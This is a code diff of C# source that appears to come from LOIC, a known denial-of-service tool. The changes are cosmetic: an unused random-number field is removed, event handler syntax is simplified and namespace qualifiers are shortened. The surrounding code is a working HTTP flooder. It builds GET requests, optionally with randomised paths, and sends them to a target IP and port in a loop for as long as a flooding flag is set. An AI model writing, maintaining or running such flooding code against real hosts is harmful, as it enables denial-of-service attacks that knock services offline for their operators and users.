@@ -24,7 +24,6 @@ namespace LOIC
 		private System.Windows.Forms.Timer tTimepoll = new System.Windows.Forms.Timer();
 
 		private long LastAction;
-		private Random rnd = new Random();
 		private bool random;
 		public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };
 
@@ -44,14 +43,14 @@ namespace LOIC
 			IsFlooding = true; LastAction = Tick();
 
 			tTimepoll = new System.Windows.Forms.Timer();
-			tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
+			tTimepoll.Tick += tTimepoll_Tick;
 			tTimepoll.Start();
 
 			var bw = new BackgroundWorker();
-			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
+			bw.DoWork += bw_DoWork;
 			bw.RunWorkerAsync();
 		}
-		void tTimepoll_Tick(object sender, EventArgs e)
+		private void tTimepoll_Tick(object sender, EventArgs e)
 		{
 			if (Tick() > LastAction + Timeout)
 			{
@@ -68,15 +67,15 @@ namespace LOIC
 			try
 			{
 				byte[] buf;
-				if (random == true)
+				if (random)
 				{
-					buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}Host: {3}{2}{2}{2}", Subsite, Functions.RandomString(), Environment.NewLine, Host));
+					buf = Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}Host: {3}{2}{2}{2}", Subsite, Functions.RandomString(), Environment.NewLine, Host));
 				}
 				else
 				{
-					buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}Host: {2}{1}{1}{1}", Subsite, Environment.NewLine, Host));
+					buf = Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}Host: {2}{1}{1}{1}", Subsite, Environment.NewLine, Host));
 				}
-				var RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
+				var RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
